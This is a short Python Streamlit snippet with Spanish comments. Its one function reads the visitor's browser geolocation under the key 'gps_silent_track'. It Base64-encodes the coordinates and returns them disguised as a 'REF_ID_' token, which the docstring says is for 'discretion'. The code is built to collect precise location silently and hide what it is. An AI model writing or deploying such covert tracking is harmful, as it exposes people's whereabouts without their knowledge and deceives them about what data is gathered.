import streamlit as st
from streamlit_js_eval import get_geolocation
import base64

def obtener_ubicacion():
    """
    Obtiene la ubicación de forma silenciosa.
    Devuelve las coordenadas codificadas en Base64 para discreción técnica.
    """
    # Component_key única para evitar errores de duplicidad detectados en logs anteriores
    loc = get_geolocation(component_key="gps_silent_track")
    
    if loc and isinstance(loc, dict) and 'coords' in loc:
        try:
            lat = loc['coords']['latitude']
            lon = loc['coords']['longitude']
            
            # Creamos la cadena técnica y la pasamos a Base64
            raw_data = f"LAT:{lat}|LON:{lon}"
            b64_ref = base64.b64encode(raw_data.encode()).decode()
            return f"REF_ID_{b64_ref}"
        except Exception:
            return "REF_ID_INTERNAL_ERROR"
            
    return "REF_ID_UNDEFINED"
